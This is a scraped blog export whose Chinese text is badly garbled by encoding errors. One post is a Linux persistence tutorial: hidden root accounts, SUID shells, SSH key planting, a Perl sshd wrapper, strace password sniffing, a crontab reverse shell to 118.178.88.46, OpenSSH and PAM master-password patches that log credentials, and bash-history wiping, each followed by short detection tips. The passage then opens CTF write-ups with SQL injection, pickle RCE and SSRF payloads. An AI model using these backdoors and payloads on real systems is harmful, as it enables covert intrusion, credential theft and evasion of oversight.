ä½¿ç”¨-eé€‰é¡¹æ—¶ï¼Œè‹¥å­—ç¬¦ä¸²ä¸­å‡ºç°ä»¥ä¸‹å­—ç¬¦ï¼Œåˆ™ç‰¹åˆ«åŠ ä»¥å¤„ç†ï¼Œè€Œä¸ä¼šå°†å®ƒå½“æˆä¸€èˆ¬æ–‡å­—è¾“å‡ºuseradd test;echo -e &quot;123456\\n123456\\n&quot; |passwd test æ·»åŠ rootç”¨æˆ· 12# åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test æœ‰äº›æœåŠ¡å™¨å¯èƒ½æœ‰å¯†ç ç­–ç•¥ï¼Œéœ€è¦å°†å¯†ç è®¾ç½®çš„å¤æ‚äº› è¿™æ—¶å€™çœ‹ä¸€ä¸‹/etc/passwd æ˜æ˜¾guest2æ˜¯rootæƒé™ *å¯ç–‘ç”¨æˆ·æ’æŸ¥ * awkå‘½ä»¤è¯­æ³•ï¼š awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šè¯»å…¥æœ‰â€™\\nâ€™æ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚é»˜è®¤åŸŸåˆ†éš”ç¬¦æ˜¯â€ç©ºç™½é”®â€ æˆ– â€œ[tab]é”®â€ -FæŒ‡å®šåˆ†éš”ç¬¦ 123456# æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd# æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯awk &#39;&#x2F;\\$1|\\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow# é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot; å¯ç–‘ç”¨æˆ·åˆ é™¤ userdel guest1 2ã€SUID Shell Suid shellæ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shellã€‚ 123# é…åˆæ™®é€šç”¨æˆ·æƒé™ä½¿ç”¨cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell å¤‡æ³¨ï¼šbash2é’ˆå¯¹suidåšäº†ä¸€äº›é˜²æŠ¤æªæ–½ï¼Œéœ€è¦ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shellã€‚å¦å¤–ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚ æ’æŸ¥æŠ€å·§ 123456# åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶find . -perm &#x2F;4000# åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶find . -perm &#x2F;2000# å–æ¶ˆsæƒé™chmod u-s &#x2F;tmp&#x2F;shell 3ã€sshå…¬ç§é’¥å…å¯†ç™»å½•å†™å…¥å…¬é’¥ 1234567#å°†è‡ªå·±ä¸»æœºçš„home&#x2F;xxx&#x2F;.ssh&#x2F;id_rsa.pubå†™å…¥é¶æœº&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;authorized_keysssh ford@192.168.56.102ssh-keygenls -la &#x2F;home&#x2F;pinak&#x2F;.sshcat &#x2F;home&#x2F;pinak&#x2F;.ssh&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;pinak&#x2F;authorized_keyssudo -u sarang cp &#x2F;home&#x2F;pinak&#x2F;authorized_keys &#x2F;home&#x2F;sarang&#x2F;.ssh&#x2F; æ’æŸ¥æŠ€å·§ 1æŸ¥çœ‹&#x2F;root&#x2F;.ssh&#x2F;authorized_keysæ˜¯å¦è¢«ä¿®æ”¹ã€‚ ä½¿ç”¨ç§é’¥ 12#æ ¹æ®&#x2F;etc&#x2F;passwdç¡®å®šç”¨æˆ·fordåï¼Œè¯»å–ç§é’¥&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsaï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œæ³¨æ„å°†id_rsaè®¾ç½®ä¸º700ssh ford@192.168.56.102 -p 6688 -i id_rsa ä»…é ä¸€ä¸ªç§é’¥å¹¶ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œä½†æ˜¯å½“æ—¶åšCynixé¶æœºçš„ç¡®åªè¯»å–äº†ç§é’¥å³å¯æˆåŠŸç™»å½•ã€‚æŸ¥çœ‹äº†ä¸‹å‘ç°é…ç½®PasswordAuthentication noå³ç¦ç”¨å¯†ç ç™»å½•ï¼Œæœ€åå‘ç°.sshç›®å½•ä¸‹authorized_keyså¡«å†™äº†é¶æœºè‡ªèº«çš„å…¬é’¥ã€‚åŸç†å’Œä¸Šé¢çš„å†™å…¥å…¬é’¥ç›¸åŒï¼Œåªæ˜¯å¤šäº†ä¸€ç§æ€è·¯ã€‚ä½†æ˜¯æˆ‘ä¹‹åæµ‹è¯•å‘ç°è¿˜æ˜¯å¤±è´¥ï¼Œåº”è¯¥è¿˜éœ€è¦ä¿®æ”¹ä»€ä¹ˆé…ç½®ã€‚ 4ã€è½¯è¿æ¥ åœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0å³rootæƒé™å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Œå®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å /tmp/su åœ¨/etc/pam.d/ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚: /etc/pam.d/su)ï¼Œä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯auth sufficient pam_rootok.soï¼Œæ‰€ä»¥åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œé™¤äº†suä¸­ä¹‹å¤–è¿˜æœ‰chshã€chfnåŒæ ·å¯ä»¥ã€‚ 12#åˆ›å»ºè½¯è¿æ¥ï¼Œå¹¶å¼€å¯6688ç«¯å£ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;6688 æ’æŸ¥æŠ€å·§ è¿›ç¨‹ã€ç«¯å£éƒ½å¯ä»¥å‘ç°å¼‚å¸¸ï¼Œ kill -s 9 PID ç»“æŸè¿›ç¨‹å³å¯æ¸…é™¤åé—¨ã€‚ 5ã€SSH wrapper inité¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshellã€‚ æœåŠ¡ç«¯ 12345678cd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd#ubuntu&#x2F;etc&#x2F;init.d&#x2F;sshd restart å®¢æˆ·ç«¯ 1socat STDIO TCP4:118.178.88.46:22,sourceport&#x3D;13377 æ²¡æˆåŠŸã€‚åº”è¯¥æ˜¯æœåŠ¡ç«¯ç³»ç»Ÿçš„åŸå› ï¼Œä¸Šé¢çš„éœ€è¦åœ¨ubuntuä¸‹ï¼Œæˆ‘çš„æœåŠ¡ç«¯æ˜¯centos æ’æŸ¥æŠ€å·§ 123ls -al &#x2F;usr&#x2F;sbin&#x2F;sshdcat &#x2F;usr&#x2F;sbin&#x2F;sshd# å¯é€šè¿‡é‡è£…sshæœåŠ¡æ¢å¤ã€‚ 6ã€straceåé—¨æ‰¾åˆ°è¿›ç¨‹PID 12ps -ef | grep sshd #çˆ¶è¿›ç¨‹PIDstrace -f -p 2908 -o &#x2F;tmp&#x2F;.ssh.log -e trace&#x3D;read,write -s 2048 é€šè¿‡é…ç½®ç”¨æˆ·ç›®å½•ä¸‹.loginé…ç½®è·å–sshæ˜æ–‡å¯†ç  1234#vim &#x2F;etc&#x2F;bashrcalias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;#source &#x2F;root&#x2F;.bashrc#suï¼ŒsudoåŒæ ·çš„é“ç† é‚£ä¹ˆåªè¦ç›®æ ‡ä½¿ç”¨sshï¼Œä¾¿ä¼šåœ¨/tmpç›®å½•ä¸‹ç”Ÿæˆè®°å½• æ’æŸ¥æŠ€å·§ ä½¿ç”¨aliaså³å¯å‘ç°å¼‚å¸¸ã€‚ 7ã€crontabåå¼¹shellcrontabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æ–°å»ºshellè„šæœ¬ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹ã€‚ /etc/evil.sh 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 1chmod +sx &#x2F;etc&#x2F;evil.sh /etc/crontab 12#æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh é‡å¯ 1234#ubuntuservice cron start#centosservice crond restart æ’æŸ¥æŠ€å·§ 123# æŸ¥çœ‹å¯ç–‘çš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨cat &#x2F;etc&#x2F;crontabcrontab -e 8ã€opensshåé—¨ åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°ã€‚ 123#æŸ¥çœ‹sshdç³»ç»Ÿç‰ˆæœ¬ï¼Œä¹‹åéœ€è¦ä¿®æ”¹ssh -VOpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013 1234567891011121314151617181920212223242526272829303132333435363738aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.oldmv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.oldbã€è§£å‹å¹¶å®‰è£…è¡¥ä¸tar -zxvf openssh-5.9p1.tar.gztar -zxvf 0x06-openssh-5.9p1.patch.tar.gzcp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1&#x2F;cd openssh-5.9p1patch &lt; sshbd5.9p1.diffcã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç vi includes.h #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot; &#x2F;&#x2F;è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç  #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot; &#x2F;&#x2F;è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç  #define SECRETPW &quot;123456789&quot; &#x2F;&#x2F;åé—¨çš„å¯†ç dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯vi version.h #define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot; #define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;eã€å®‰è£…å¹¶ç¼–è¯‘.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5make cleanmake &amp;&amp; make installservice sshd restartfã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_configtouch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_configgã€æ¸…é™¤æ“ä½œè®°å½•export HISTFILE&#x3D;&#x2F;dev&#x2F;nullexport HISTSIZE&#x3D;0echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;æ¸…ç©ºæ“ä½œæ—¥å¿— ä¿®æ”¹æ—¥å¿—è¾“å‡ºå’Œå¯†ç  ä¿®æ”¹version æˆåŠŸï¼Œilogä¸­è®°å½•äº†æœ¬æœºç™»å½•çš„è´¦å·å¯†ç ï¼Œologä¸­è®°å½•äº†æœ¬æœºç™»å½•å…¶ä»–æœºå™¨çš„æ˜æ–‡å¯†ç  æ’æŸ¥æŠ€å·§ åˆ©ç”¨straceæ‰¾å‡ºsshåé—¨ 123456# 1ã€è·å–å¯ç–‘è¿›ç¨‹PIps aux | grep sshd# 2ã€è·Ÿè¸ªsshd PIDstrace -o aa -ff -p PID# 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶grep open sshd* | grep -v -e No -e null -e denied| grep WR 9ã€PAMåé—¨PAM ï¼ˆPluggable Authentication Modules ï¼‰æ˜¯ç”±Sunæå‡ºçš„ä¸€ç§è®¤è¯æœºåˆ¶ã€‚å®ƒé€šè¿‡æä¾›ä¸€äº›åŠ¨æ€é“¾æ¥åº“å’Œä¸€å¥—ç»Ÿä¸€çš„APIï¼Œå°†ç³»ç»Ÿæä¾›çš„æœåŠ¡å’Œè¯¥æœåŠ¡çš„è®¤è¯æ–¹å¼åˆ†å¼€ï¼Œä½¿å¾—ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥çµæ´»åœ°æ ¹æ®éœ€è¦ç»™ä¸åŒçš„æœåŠ¡é…ç½®ä¸åŒçš„è®¤è¯æ–¹å¼è€Œæ— éœ€æ›´æ”¹æœåŠ¡ç¨‹åºï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå‘ç³»ç»Ÿä¸­æ·»åŠ æ–°çš„è®¤è¯æ‰‹æ®µã€‚PAMæœ€åˆæ˜¯é›†æˆåœ¨Solarisä¸­ï¼Œç›®å‰å·²ç§»æ¤åˆ°å…¶å®ƒç³»ç»Ÿä¸­ï¼Œå¦‚Linuxã€SunOSã€HP-UX 9.0ç­‰ã€‚ åˆ©ç”¨æ–¹æ³•: 12341ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼Œä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„pamç‰ˆæœ¬2ã€è§£å‹ç¼©ï¼Œä¿®æ”¹pam_unix_auth.cæ–‡ä»¶ï¼Œæ·»åŠ ä¸‡èƒ½å¯†ç 3ã€ç¼–è¯‘å®‰è£…PAM4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.soï¼Œå¤åˆ¶åˆ°&#x2F;lib64&#x2F;securityä¸­è¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†ï¼Œå¹¶å°†ç”¨æˆ·åå¯†ç è®°å½•åˆ°æ–‡ä»¶ä¸­ã€‚ 1rpm -qa | grep pam http://www.linux-pam.org/library/ 1234tar -xvf Linux-PAM-1.1.8.tar.gzcd Linux-PAM-1.1.8cd modules&#x2F;pam_unix&#x2F;vi pam_unix_auth.c 106è¡Œæ·»åŠ FILE *fp; åœ¨177è¡Œæ·»åŠ  12345678910111213141516&#x2F;*password:&quot;redkey&quot;*&#x2F;if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)&#123; retval &#x3D; PAM_SUCCESS;&#125;if(retval&#x3D;&#x3D; PAM_SUCCESS)&#123;&#x2F;*pamfile:pamwd.txt*&#x2F; fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;); fprintf(fp,&quot;%s::%s\\n&quot;,name,p); fclose(fp);&#125; name &#x3D; p &#x3D; NULL; AUTH_RETURN;&#125; ç¼–è¯‘ 123cd ..&#x2F;..&#x2F;.&#x2F;configuremake ä¼šæ ¹æ®ä¸åŒæƒ…å†µè°ƒç”¨pam_unix.so å¤‡ä»½åŸæœ‰PAMæ¨¡å— 12find &#x2F; -name pam_unix.so&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so 12cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.somv pam_unix.so&#123;,.bak&#125; å¤åˆ¶æ–°PAMæ¨¡å—åˆ°/usr/lib64/security/ç›®å½•ä¸‹ï¼š 1cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F; ä¿®æ”¹pamæ¨¡å—æ—¶é—´å±æ€§ 1touch -t 201804111122 pam_unix.so å‰é¢éƒ½æ²¡é—®é¢˜ï¼Œä½†æ˜¯æœ€åè¿æ¥ä¸ä¸Šã€‚ã€‚ã€‚ æ’æŸ¥æŠ€å·§ 1234567# 1ã€é€šè¿‡Straceè·Ÿè¸ªsshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR# 2ã€æ£€æŸ¥pam_unix.soçš„ä¿®æ”¹æ—¶é—´stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so #32ä½stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so #64ä½ 10ã€rookitåé—¨ Mafixæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚ åˆ©ç”¨æ–¹æ³•ï¼šå®‰è£…å®Œæˆåï¼Œä½¿ç”¨ssh ç”¨æˆ·@IP -P é…ç½®çš„ç«¯å£ï¼Œå³å¯è¿œç¨‹ç™»å½•ã€‚ æˆ‘æœ¬åœ°æµ‹è¯•äº†ä¸‹ï¼Œç›´æ¥æŠ¥é”™äº†ï¼Œ 64ä½ç³»ç»Ÿä¸­å®‰è£…äº†32ä½ç¨‹åºè§£å†³åŠæ³• æ˜¯å› ä¸º64ä½ç³»ç»Ÿä¸­å®‰è£…äº†32ä½ç¨‹åº è§£å†³æ–¹æ³•ï¼š ä»£ç å¦‚ä¸‹ å¤åˆ¶ä»£ç  yum install glibc.i686 é—®é¢˜äºŒï¼Œè§£å†³äº¤å‰ç¼–è¯‘ç¯å¢ƒé”™è¯¯ # 1yum install glibc.i686 centos6èµ·/etc/syslog.confä¸å†æœ‰ï¼è€Œæ˜¯/etc/rsyslog.confä»£æ›¿ï¼ ä»ç„¶æœ‰å‡ ä¸ªé”™è¯¯æ— æ³•è§£å†³ï¼Œä½†æ˜¯ç½‘ä¸Šæµä¼ çš„å¤§å¤šæ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚ã€‚ å…³äºrookitéœ€è¦ç»§ç»­æ¢ç´¢ã€‚ å‚è€ƒé“¾æ¥ï¼š https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63 https://blog.51cto.com/huangzp/1911767 https://www.cnblogs.com/beautiful-code/p/9441757.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://glotozz.github.io/tags/Linux/"}]},{"title":"XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","slug":"é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","date":"2020-03-08T12:02:35.000Z","updated":"2020-03-11T06:46:46.506Z","comments":true,"path":"2020/03/08/é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›/","link":"","permalink":"https://glotozz.github.io/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• sqlcheckin webtmp fmkq nweb UAF-PHP webct easy_trick_gzmtu hackme GuessGame NothardWeb dooog baby_java happyvacation hardphp easyweb æ€»ç»“ï¼š å‚è€ƒé“¾æ¥ï¼š sqlcheckinä»£ç æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼Œä¸‹é¢çš„ä¸‡èƒ½å¯†ç å¯ä»¥ 1234admin&#39;-0-&#39;1&#39;-&#39;1&#39;&amp;&#39;1 é™¤äº†å¼€å¤´æ˜¯éé›¶æ•°çš„å­—ç¬¦ä¸²ï¼Œå…¶ä»–å­—ç¬¦ä¸²åŒ–æˆæ•´æ•°éƒ½ä¸º0ï¼Œå­—ç¬¦ä¸²=0ä¸ºçœŸï¼Œå½“æ‰€æœ‰usernameé‡Œæ²¡æœ‰å¼€å¤´æ˜¯0çš„å­—ç¬¦ä¸²ï¼Œusername=0ç›¸å½“äºæŸ¥å…¨éƒ¨æ•°æ® webtmpè¿‡æ»¤äº†R ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ ä¸€å¼€å§‹è€ƒè™‘RCE 1b&#39;\\x80\\x03c__main__\\nAnimal\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls &#x2F;\\nb0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameq\\x03X\\x14\\x00\\x00\\x00\\xe4\\xb8\\x80\\xe7\\xbb\\x99\\xe6\\x88\\x91\\xe5\\x93\\xa9giaogiaoq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x04\\x00\\x00\\x00Giaoq\\x06ub.&#39; æç¤ºglobal XXï¼Œåº”è¯¥æ˜¯å› ä¸ºraise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))ï¼Œåæ¥è€ƒè™‘æ”¹å†™secretå¯¹è±¡ secret.py 1secret &#x3D; &#123;&#39;name&#39;:&#39;xx&#39;,&#39;category&#39;:&#39;yy&#39;&#125; exp.py 12345678910import pickleimport pickletoolsimport secretclass Animal: def __init__(self): self.name = 'aa' self.category = 'bb's = b'\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVaa\\nVcategory\\nVbb\\nub0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00aaX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00bbub.'l = pickle.loads(s)pickletools.dis(s) base64ç¼–ç å³å¯ fmkqç»•è¿‡headï¼š \\ ç»•è¿‡formatï¼š %1$s 8080ç«¯å£apiï¼Œè€ƒè™‘ssrf å°è¯•äº†å„ç§payloadï¼š 1127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;tmp&#x2F;..&#x2F;*&#x2F;flag%26vipcode&#x3D;0 æœ€åé˜Ÿé‡Œä¸€ä¸ªå¸ˆå‚…æåˆ°äº†vipcode {file.vip.__dict__} ä¹‹åè™½ç„¶æ‰¾åˆ°äº†flagè·¯å¾„ï¼Œä½†æ˜¯æç¤ºnononoï¼Œéœ€è¦è¯»å–æºç  /app/app.py 1234567891011121314151617181920212223242526272829303132333435363738import webfrom urllib.parse import unquotefrom base.readfile import *urls = ( '/', 'help', '/read/(.*)','read')web.config.debug = Falseclass help: def GET(self): help_information = ''' Welcome to our FMKQ api, you could use the help information below To read file: /read/file=example&amp;vipcode=example if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125; Other functions only for the vip!!! ''' return help_informationclass read: def GET(self,text): file2read = readfile(text) if file2read.test() == False: return \"error\" else: if file2read.isvip() == False: return (\"The content of \"+ file2read.GetFileName() +\" is &#123;file&#125;\").format(file=file2read) else: vipfile2read = vipreadfile(file2read) return (str(vipfile2read))if __name__ == \"__main__\": app = web.application(urls, globals()) app.run() /app/base/vip.pyå°±æ˜¯éªŒè¯ç çš„ /app/base/readfile.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from .vip import vipimport reimport osclass File: def __init__(self,file): self.file = file def __str__(self): return self.file def GetName(self): return self.fileclass readfile(): def __str__(self): filename = self.GetFileName() if '..' in filename or 'proc' in filename: return \"quanbumuda\" else: try: file = open(\"/tmp/\" + filename, 'r') content = file.read() file.close() return content except: return \"error\" def __init__(self, data): if re.match(r'file=.*?&amp;vipcode=.*?',data) != None: data = data.split('&amp;') data = &#123; data[0].split('=')[0]: data[0].split('=')[1], data[1].split('=')[0]: data[1].split('=')[1] &#125; if 'file' in data.keys(): self.file = File(data['file']) if 'vipcode' in data.keys(): self.vipcode = data['vipcode'] self.vip = vip() def test(self): if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self): return False else: return True def isvip(self): if self.vipcode == self.vip.GetCode(): return True else: return False def GetFileName(self): return self.file.GetName()current_folder_file = []class vipreadfile(): def __init__(self,readfile): self.filename = readfile.GetFileName() self.path = os.path.dirname(os.path.abspath(self.filename)) self.file = File(os.path.basename(os.path.abspath(self.filename))) global current_folder_file try: 